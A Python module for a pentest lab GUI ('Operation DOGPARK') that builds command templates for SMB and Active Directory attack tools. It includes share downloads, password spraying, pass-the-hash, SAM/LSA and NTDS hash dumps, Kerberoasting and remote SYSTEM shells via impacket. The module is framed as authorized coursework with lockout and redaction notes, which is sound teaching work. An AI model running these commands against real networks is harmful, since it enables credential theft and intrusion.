"""Deep command catalog for the SMB / Active Directory group.

Scope: this module is reference command-building for an AUTHORIZED, isolated CSUSB cyberlab
class engagement ("Operation DOGPARK") against a simulated enterprise (Windows clients, a LAN
router, an AD Domain Controller). Every entry below is a standard, documented Kali tool
invocation with placeholders — the GUI shows the built command for the pentester to review and
run manually. Nothing here is destructive: no account-lockout bombing, no DoS, no data
destruction. Authenticated actions require credentials the operator already holds and are used
only against in-scope lab hosts. Golden-ticket forgery is intentionally NOT templated — the
engagement report only tracks it yes/no — so the most sensitive bit stays out of the tool.
"""

from __future__ import annotations

from dogpark.tools import Action

# Phases: SMB/AD work lands mostly in DMZ (3-5) and LAN (6-7). Null-session enumeration is
# quiet; credentialed dumps and password sprays are loud and carry lockout/authorization notes.

_enum4linux = (
    Action(
        id="enum4linux.full",
        label="Full enumeration (-a)",
        phase=3,
        description="Runs enum4linux's full suite against an SMB host: users, shares, groups, "
        "password policy, OS info and RID cycling. The broadest first look at a Windows/Samba box.",
        risk="normal",
        template="enum4linux -a {target} | tee {output}/enum4linux_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="enum4linux.users",
        label="Users (-U)",
        phase=3,
        description="Enumerate user accounts via null/guest session where the host allows it.",
        risk="quiet",
        template="enum4linux -U {target} | tee {output}/enum4linux_users_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="enum4linux.shares",
        label="Shares (-S)",
        phase=3,
        description="List SMB shares the host exposes, a map of where data and loot may live.",
        risk="quiet",
        template="enum4linux -S {target} | tee {output}/enum4linux_shares_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="enum4linux.groups",
        label="Groups (-G)",
        phase=3,
        description="Enumerate local and domain groups and their members.",
        risk="quiet",
        template="enum4linux -G {target} | tee {output}/enum4linux_groups_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="enum4linux.policy",
        label="Password policy (-P)",
        phase=3,
        description="Read the account/password policy (lockout threshold, min length). Check this "
        "BEFORE any spray so you don't lock accounts.",
        risk="quiet",
        template="enum4linux -P {target} | tee {output}/enum4linux_policy_{target}.txt",
        needs=("target", "output"),
        notes="Read the lockout threshold here first — it governs whether a spray is safe.",
    ),
    Action(
        id="enum4linux.authed",
        label="Authenticated full (-a with creds)",
        phase=4,
        description="Same full sweep but using a known user/password, which typically returns far "
        "more than a null session.",
        risk="normal",
        template="enum4linux -a -u {user} -p {password} {target} | tee {output}/enum4linux_auth_{target}.txt",
        needs=("target", "user", "password", "output"),
    ),
    Action(
        id="enum4linux_ng.full",
        label="enum4linux-ng full (-A)",
        phase=3,
        description="The modern rewrite, enum4linux-ng, with JSON/YAML output — use if installed.",
        risk="normal",
        template="enum4linux-ng -A {target} -oJ {output}/enum4linuxng_{target}",
        needs=("target", "output"),
    ),
)

_smbclient = (
    Action(
        id="smbclient.list_null",
        label="List shares (null session)",
        phase=3,
        description="List shares with an anonymous/null session — fast check for guest-readable shares.",
        risk="quiet",
        template="smbclient -L //{target}/ -N | tee {output}/smbclient_shares_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="smbclient.list_auth",
        label="List shares (authenticated)",
        phase=4,
        description="List shares using known credentials — usually reveals more than a null session.",
        risk="quiet",
        template="smbclient -L //{target}/ -U {domain}\\\\{user}%{password} | tee {output}/smbclient_shares_auth_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="smbclient.connect",
        label="Connect to a share",
        phase=4,
        description="Open an interactive session on a specific share to browse its contents.",
        risk="normal",
        template="smbclient //{target}/{share} -U {domain}\\\\{user}%{password}",
        needs=("target", "share", "user", "password", "domain"),
    ),
    Action(
        id="smbclient.recurse_get",
        label="Recursively download a share",
        phase=4,
        description="Mirror a readable share to the loot directory (recurse + prompt off + mget *).",
        risk="normal",
        template="smbclient //{target}/{share} -U {domain}\\\\{user}%{password} -c 'recurse ON; prompt OFF; mget *' -D / ",
        needs=("target", "share", "user", "password", "domain"),
        notes="Run from inside {output}/loot so files land in the evidence tree.",
    ),
    Action(
        id="smbclient.put",
        label="Upload a file to a share",
        phase=6,
        description="Place a file on a writable in-scope share — e.g. moving a tool between lab hosts.",
        risk="normal",
        template="smbclient //{target}/{share} -U {domain}\\\\{user}%{password} -c 'put {file}'",
        needs=("target", "share", "user", "password", "domain", "file"),
        notes="In-scope lab hosts only.",
    ),
    Action(
        id="smbclient.signing",
        label="Check SMB signing (via nmap note)",
        phase=3,
        description="Not an smbclient flag — reminder to confirm SMB signing with "
        "'nmap --script smb2-security-mode -p445 {target}', which matters for relay viability.",
        risk="quiet",
        template="nmap --script smb2-security-mode -p445 {target} -oN {output}/smb_signing_{target}.txt",
        needs=("target", "output"),
    ),
)

_smbmap = (
    Action(
        id="smbmap.shares_null",
        label="Shares + permissions (null)",
        phase=3,
        description="Enumerate shares and your access level (READ/WRITE) with a null session.",
        risk="quiet",
        template="smbmap -H {target} | tee {output}/smbmap_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="smbmap.shares_auth",
        label="Shares + permissions (authenticated)",
        phase=4,
        description="Same, with credentials — shows per-share READ/WRITE for your user.",
        risk="quiet",
        template="smbmap -H {target} -u {user} -p {password} -d {domain} | tee {output}/smbmap_auth_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="smbmap.recurse",
        label="Recursive directory listing",
        phase=4,
        description="Walk a share's directory tree to locate interesting files before downloading.",
        risk="normal",
        template="smbmap -H {target} -u {user} -p {password} -d {domain} -R {share} | tee {output}/smbmap_recurse_{target}.txt",
        needs=("target", "user", "password", "domain", "share", "output"),
    ),
    Action(
        id="smbmap.download",
        label="Download a file",
        phase=4,
        description="Pull a single file from a readable share into the loot directory.",
        risk="normal",
        template="smbmap -H {target} -u {user} -p {password} -d {domain} --download '{file}'",
        needs=("target", "user", "password", "domain", "file"),
    ),
    Action(
        id="smbmap.pth",
        label="Pass-the-hash enumeration",
        phase=6,
        description="Enumerate shares using an NTLM hash instead of a password (pass-the-hash).",
        risk="normal",
        template="smbmap -H {target} -u {user} -p {hash} -d {domain} | tee {output}/smbmap_pth_{target}.txt",
        needs=("target", "user", "hash", "domain", "output"),
        notes="{hash} is an LM:NT hash you already recovered. In-scope lab hosts only.",
    ),
)

_crackmapexec = (
    Action(
        id="cme.smb_enum",
        label="SMB host enum",
        phase=3,
        description="Fingerprint an SMB host (OS, hostname, domain, signing, SMBv1) — fast triage "
        "across one host or a CIDR.",
        risk="quiet",
        template="crackmapexec smb {target} | tee {output}/cme_smb_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="cme.null_shares",
        label="Null-session shares",
        phase=3,
        description="List shares with a null session across the target(s).",
        risk="quiet",
        template="crackmapexec smb {target} -u '' -p '' --shares | tee {output}/cme_null_shares_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="cme.auth_shares",
        label="Authenticated shares",
        phase=4,
        description="Enumerate shares and READ/WRITE access with credentials.",
        risk="normal",
        template="crackmapexec smb {target} -u {user} -p {password} -d {domain} --shares | tee {output}/cme_shares_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="cme.sessions",
        label="Sessions / logged-on users",
        phase=4,
        description="Show active sessions and logged-on users — maps where accounts are in use.",
        risk="normal",
        template="crackmapexec smb {target} -u {user} -p {password} -d {domain} --sessions --loggedon-users | tee {output}/cme_sessions_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="cme.users_groups",
        label="Domain users / groups / pass-pol",
        phase=4,
        description="Pull domain users, groups and the password policy over SMB with credentials.",
        risk="normal",
        template="crackmapexec smb {target} -u {user} -p {password} -d {domain} --users --groups --pass-pol | tee {output}/cme_users_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="cme.spray",
        label="Password spray (lockout-aware)",
        phase=4,
        description="Try ONE password against a user list across hosts. Only after reading the "
        "lockout policy. This is a deliberate, low-and-slow check, not a brute force.",
        risk="loud",
        template="crackmapexec smb {target} -u {userlist} -p {password} -d {domain} --continue-on-success | tee {output}/cme_spray_{target}.txt",
        needs=("target", "userlist", "password", "domain", "output"),
        notes="Check the lockout threshold FIRST (enum4linux -P). One password per round, wait out "
        "the reset window between rounds. Authorized lab targets only.",
    ),
    Action(
        id="cme.pth",
        label="Pass-the-hash auth check",
        phase=6,
        description="Validate an NTLM hash against hosts (pass-the-hash) and show where it is admin.",
        risk="normal",
        template="crackmapexec smb {target} -u {user} -H {hash} -d {domain} | tee {output}/cme_pth_{target}.txt",
        needs=("target", "user", "hash", "domain", "output"),
        notes="{hash} is an NT hash you already recovered.",
    ),
    Action(
        id="cme.winrm",
        label="WinRM auth check",
        phase=6,
        description="Check credentials over WinRM (5985/5986) — often the path to a shell on Windows.",
        risk="normal",
        template="crackmapexec winrm {target} -u {user} -p {password} -d {domain} | tee {output}/cme_winrm_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
    ),
    Action(
        id="cme.ldap_enum",
        label="LDAP domain enum",
        phase=6,
        description="Query the DC over LDAP for users and metadata (e.g. --users, --asreproast).",
        risk="normal",
        template="crackmapexec ldap {dc_ip} -u {user} -p {password} -d {domain} --users | tee {output}/cme_ldap_{dc_ip}.txt",
        needs=("dc_ip", "user", "password", "domain", "output"),
    ),
    Action(
        id="cme.secrets",
        label="Dump SAM/LSA (local admin required)",
        phase=6,
        description="With local-admin creds, dump cached local secrets (SAM/LSA) from a host. A "
        "credentialed post-exploitation step, labeled loud.",
        risk="loud",
        template="crackmapexec smb {target} -u {user} -p {password} -d {domain} --sam --lsa | tee {output}/cme_secrets_{target}.txt",
        needs=("target", "user", "password", "domain", "output"),
        notes="Requires local admin on {target}. Redact recovered secrets in the report. Authorized "
        "lab hosts only.",
    ),
)

_impacket = (
    Action(
        id="impacket.lookupsid",
        label="lookupsid (RID brute user enum)",
        phase=4,
        description="Enumerate domain users by cycling RIDs via MS-LSAT — works with a low-priv "
        "account or sometimes a null session.",
        risk="normal",
        template="impacket-lookupsid {domain}/{user}:{password}@{target} | tee {output}/lookupsid_{target}.txt",
        needs=("domain", "user", "password", "target", "output"),
    ),
    Action(
        id="impacket.rpcdump",
        label="rpcdump (RPC endpoint map)",
        phase=3,
        description="List the host's RPC endpoints — useful for spotting services like the printer "
        "spooler or task scheduler.",
        risk="quiet",
        template="impacket-rpcdump {target} | tee {output}/rpcdump_{target}.txt",
        needs=("target", "output"),
    ),
    Action(
        id="impacket.samrdump",
        label="samrdump (user/policy via SAMR)",
        phase=4,
        description="Enumerate users and account policy over the SAMR interface with credentials.",
        risk="normal",
        template="impacket-samrdump {domain}/{user}:{password}@{target} | tee {output}/samrdump_{target}.txt",
        needs=("domain", "user", "password", "target", "output"),
    ),
    Action(
        id="impacket.getnpusers",
        label="GetNPUsers (AS-REP roast)",
        phase=4,
        description="Find accounts with Kerberos pre-auth disabled and request their AS-REP hashes "
        "for offline cracking. Needs only a user list or a low-priv account.",
        risk="normal",
        template="impacket-GetNPUsers {domain}/ -usersfile {userlist} -dc-ip {dc_ip} -no-pass -format hashcat -outputfile {output}/asrep_hashes.txt",
        needs=("domain", "userlist", "dc_ip", "output"),
        notes="Crack the output offline with hashcat -m 18200.",
    ),
    Action(
        id="impacket.getuserspns",
        label="GetUserSPNs (Kerberoast)",
        phase=6,
        description="Request service tickets for accounts with SPNs and export them for offline "
        "cracking — the classic Kerberoast. Needs any valid domain account.",
        risk="normal",
        template="impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile {output}/kerberoast_hashes.txt",
        needs=("domain", "user", "password", "dc_ip", "output"),
        notes="Crack the output offline with hashcat -m 13100.",
    ),
    Action(
        id="impacket.gettgt",
        label="getTGT (request a TGT)",
        phase=6,
        description="Request a Kerberos TGT with a password or hash and cache it (.ccache) for "
        "subsequent Kerberos auth.",
        risk="normal",
        template="impacket-getTGT {domain}/{user}:{password} -dc-ip {dc_ip}",
        needs=("domain", "user", "password", "dc_ip"),
    ),
    Action(
        id="impacket.secretsdump",
        label="secretsdump (credentialed hash dump)",
        phase=6,
        description="With appropriate credentials, dump account hashes (local SAM, or domain NTDS "
        "from a DC). A credentialed post-exploitation step for mapping credential reuse.",
        risk="loud",
        template="impacket-secretsdump {domain}/{user}:{password}@{target} -outputfile {output}/secretsdump_{target}",
        needs=("domain", "user", "password", "target", "output"),
        notes="DC/NTDS dumping needs domain-admin-equivalent rights. Redact all recovered hashes in "
        "the report. Authorized lab hosts only.",
    ),
    Action(
        id="impacket.secretsdump_pth",
        label="secretsdump via pass-the-hash",
        phase=6,
        description="Same as above but authenticating with an NT hash instead of a password.",
        risk="loud",
        template="impacket-secretsdump {domain}/{user}@{target} -hashes {hash} -outputfile {output}/secretsdump_{target}",
        needs=("domain", "user", "hash", "target", "output"),
        notes="Redact recovered hashes. Authorized lab hosts only.",
    ),
    Action(
        id="impacket.psexec",
        label="psexec (authenticated shell)",
        phase=6,
        description="Get an interactive SYSTEM shell on a host where you have admin credentials "
        "(creates/starts a service). The loudest of the exec options.",
        risk="loud",
        template="impacket-psexec {domain}/{user}:{password}@{target}",
        needs=("domain", "user", "password", "target"),
        notes="Requires admin on {target}. Noisy (service creation). Authorized lab hosts only.",
    ),
    Action(
        id="impacket.wmiexec",
        label="wmiexec (quieter authed exec)",
        phase=6,
        description="Semi-interactive command execution over WMI with admin credentials — quieter "
        "than psexec (no service created).",
        risk="normal",
        template="impacket-wmiexec {domain}/{user}:{password}@{target}",
        needs=("domain", "user", "password", "target"),
        notes="Requires admin on {target}. Authorized lab hosts only.",
    ),
    Action(
        id="impacket.smbexec",
        label="smbexec (authed exec)",
        phase=6,
        description="Command execution over SMB with admin credentials — an alternative to psexec.",
        risk="loud",
        template="impacket-smbexec {domain}/{user}:{password}@{target}",
        needs=("domain", "user", "password", "target"),
        notes="Requires admin on {target}. Authorized lab hosts only.",
    ),
)

EXTRA_ACTIONS = {
    "enum4linux": _enum4linux,
    "smbclient": _smbclient,
    "smbmap": _smbmap,
    "crackmapexec": _crackmapexec,
    "impacket-scripts": _impacket,
}
